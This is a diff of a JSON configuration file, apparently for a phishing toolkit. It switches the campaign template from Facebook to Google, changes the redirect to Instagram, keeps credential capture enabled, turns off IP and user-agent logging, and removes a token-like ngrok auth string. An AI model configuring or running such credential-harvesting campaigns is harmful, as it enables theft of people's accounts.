@@ -9,16 +9,16 @@
   "tunnel": {
     "enabled": false,
     "provider": "ngrok",
-    "ngrok_auth_token": "3EUek75LEIbTTfuk3C9MOMHQusJ_5dNUYDZSsCcArkR6Zngwf",
+    "ngrok_auth_token": "",
     "cloudflare_api_token": ""
   },
   "campaign": {
-    "template": "facebook",
-    "redirect_url": "https://www.facebook.com",
+    "template": "google",
+    "redirect_url": "https://www.instagram.com",
     "capture_credentials": true,
     "capture_otp": false,
-    "log_ips": true,
-    "log_user_agents": true,
+    "log_ips": false,
+    "log_user_agents": false,
     "log_geolocation": false
   }
 }
